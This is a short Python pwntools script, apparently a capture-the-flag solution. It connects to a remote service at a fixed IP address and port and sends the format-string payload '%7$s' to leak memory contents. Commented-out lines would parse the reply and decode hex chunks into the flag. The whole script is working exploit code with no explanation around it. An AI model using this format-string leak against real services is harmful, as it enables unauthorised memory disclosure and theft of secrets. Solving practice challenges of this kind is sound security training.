#nc 103.41.205.26 10002

from pwn import *
from binascii import unhexlify
from Crypto.Util.number import long_to_bytes

# get from fmtarg
payload = "%7$s".encode("latin-1")
print(payload)

p = remote("103.41.205.26", 10002)
print(p.recvline())
print(p.recvline())
p.sendline(payload)
print(p.recvline())
# p.interactive()


# p.interactive()

#ans = p.recvline().decode()
#ans = ans.split(", ")

#flag = ans[1]
#flag = flag.split("-")
#p.close()


#for string in flag:
 #   try:
  #      print(long_to_bytes(int(string, 16)))
   # except:
    #  pass

# ans = ans.split(" ")
# print(ans[1])
